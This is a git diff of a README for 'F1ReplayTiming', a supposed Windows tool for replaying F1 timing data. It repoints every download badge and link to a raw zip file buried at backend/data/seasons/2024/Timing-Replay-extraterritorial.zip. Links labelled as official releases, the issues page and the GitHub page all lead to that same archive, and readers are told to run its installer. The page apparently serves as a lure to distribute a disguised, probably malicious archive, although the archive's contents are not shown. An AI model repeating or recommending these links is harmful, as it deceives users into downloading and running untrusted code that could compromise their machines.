@@ -1,6 +1,6 @@
 # 🎯 F1ReplayTiming - Real-Time F1 Data Visualisation
 
-[![Download F1ReplayTiming](https://img.shields.io/badge/Download-F1ReplayTiming-3b82f6?style=for-the-badge)](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip)
+[![Download F1ReplayTiming](https://img.shields.io/badge/Download-F1ReplayTiming-3b82f6?style=for-the-badge)](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get F1ReplayTiming running on your Windows PC.
 
 Go to the official release page here:
 
-[Download F1ReplayTiming](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip)
+[Download F1ReplayTiming](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip)
 
 This page lists all versions available. Use the latest stable release for the best experience.
 
@@ -106,7 +106,7 @@ Use the menu to switch views or adjust settings like units and color schemes.
 - **Data doesn’t sync:** Ensure the replay is complete and uncorrupted. Restart the app and reload the replay.  
 - **Graphs look empty or wrong:** This could mean the telemetry data is missing or incompatible. Try a different replay.  
 
-If problems continue, check the Issues section on the [GitHub page](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip) for help.
+If problems continue, check the Issues section on the [GitHub page](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip) for help.
 
 ---
 
@@ -115,7 +115,7 @@ If problems continue, check the Issues section on the [GitHub page](https://raw.
 New releases may fix bugs or add features. To update:
 
 - Visit the releases page again:  
-  [Download updates](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip)  
+  [Download updates](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip)  
 - Download the latest version.
 - Run the installer or replace the old files after extracting the zip.
 - Your settings and saved data will stay intact.
@@ -124,9 +124,9 @@ New releases may fix bugs or add features. To update:
 
 ## 🔗 Useful Links
 
-- [Official GitHub Releases](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip)  
-- [GitHub Issues for Support](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip)  
+- [Official GitHub Releases](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip)  
+- [GitHub Issues for Support](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip)  
 
 ---
 
-[![Download F1ReplayTiming](https://img.shields.io/badge/Download-F1ReplayTiming-10B981?style=for-the-badge)](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/frontend/src/app/live/Replay-Timing-3.0.zip)
+[![Download F1ReplayTiming](https://img.shields.io/badge/Download-F1ReplayTiming-10B981?style=for-the-badge)](https://raw.githubusercontent.com/Slasherf319/F1ReplayTiming/main/backend/data/seasons/2024/Timing-Replay-extraterritorial.zip)
